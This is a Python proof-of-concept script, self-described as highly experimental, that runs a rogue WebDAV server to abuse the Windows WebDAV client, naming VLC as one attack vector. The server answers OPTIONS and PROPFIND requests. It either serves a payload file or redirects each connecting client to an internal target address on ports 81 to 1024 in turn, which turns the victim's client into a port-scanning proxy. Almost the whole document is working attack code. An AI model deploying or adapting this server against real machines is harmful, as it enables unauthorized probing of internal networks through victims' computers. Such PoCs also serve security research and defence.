#!/usr/bin/env python
#
# PoC for playing and abusing the Windows' WebDAV Client (e,g. through attack
# vector such as VLC).
#
# Disclaimer: Highly Experimental ;-)
#
import socket
import signal
import sys
from collections import defaultdict

class Server():
    def __init__(self, port=80, redir=0):
        self.host = '0.0.0.0'
        self.port = port
	self.redir = redir
        self.peers = defaultdict(list)
        self.target = '10.240.0.124'
        self.urischeme = 'http://'
        self.port_start = 81
        self.port_end = 1024

    def run(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.socket.bind((self.host, self.port))
        except Exception as err:
            print "Error while binding to socket on port %s\n" % self.port
            print "Error: %s" % err
            self.shutdown()
            sys.exit(1)
        self._wait_for_connection()

    def shutdown(self):
	s.socket.shutdown(socket.SHUT_RDWR)
	s.socket.close()

    def _generate_ports(self, start, end, peer):
        if peer in self.peers:
            del self.peers[peer][0]
            return self.peers[peer][0]
        else:
            for port in range(start, end):
                self.peers[peer].append(port)
            return self.peers[peer][0]

    def _generate_responses(self, method, redir, peer):
        r = 'HTTP/1.1 207 Multi-Status' + '\r\n'
        r += 'Content-Type: ' + 'text/xml' + '\r\n'
        if method == 'OPTIONS':
            r += 'MS-Author-Via: ' + 'DAV' + '\r\n'
            r += 'DASL: ' + '<DAV:sql>' + '\r\n'
            r += 'DAV: ' + '1, 2' + '\r\n'
            r += 'Allow: ' + 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH' + '\r\n'
            r += 'Public: ' + 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK' + '\r\n'
            r += 'Cache-Control: ' + 'private' + '\r\n'
            r += 'Connection: ' + 'Keep-Alive ' + '\r\n'
            r += 'Server: ' + 'Apache' + '\r\n'
            r += 'Content-Length: ' + '0' + '\r\n\r\n'
        elif (method == 'PROPFIND') and (redir == 0):
            f = open('payload.xml', 'r')
            body = f.read()
            r += 'Connection: ' + 'Keep-Alive ' + '\r\n'
            r += 'Server: ' + 'Apache' + '\r\n'
            #r += 'Content-Length: ' + str(len(body)) + '\r\n\r\n'
            r += 'Content-Length: ' + '0' + '\r\n\r\n'
            r += body
	elif (method == 'PROPFIND') and (redir == 1):
            rport = str(self._generate_ports(self.port_start, self.port_end, peer))
            r = 'HTTP/1.1 301 Moved' + '\r\n'
            r += 'Content-Type: ' + 'text/html' + '\r\n'
            r += 'Location: ' + self.urischeme + self.target + ':' + rport + '/' + '\r\n'
            r += 'Connection: ' + 'Keep-Alive ' + '\r\n'
            r += 'Server: ' + 'Apache' + '\r\n'
            #r += 'Host: ' + "A" * 5000 + '\r\n'
            r += 'Content-Length: ' + '0' + '\r\n\r\n'
            print "[*] Redirecting WebDAV Client to %s, port %s" % (self.target, rport)
        return r

    def _wait_for_connection(self):
        while True:
            self.socket.listen(5)
            c, addr = self.socket.accept()
            peer = c.getpeername()
            print "[+] Client %s connected from port tcp/%s" % (str(peer[0]), str(peer[1]))
            data = c.recv(1024)
            string = bytes.decode(data)
            r_method = string.split(' ')[0]
            print "[*] Received %s request" % r_method
            print "[*] Request Body: %s " % string
            if (r_method == 'OPTIONS') or (r_method == 'PROPFIND'):
                resp = self._generate_responses(r_method, self.redir, peer[0])
                server_response = resp.encode()
                c.send(server_response)

def _graceful_shutdown(sig, dummy):
    print "\nCTRL-C hit, shutting down..."
    s.shutdown()
    sys.exit(1)

if __name__ == "__main__":
    # handle SIGINT
    signal.signal(signal.SIGINT, _graceful_shutdown)
    s = Server(80, 1)
    s.run()
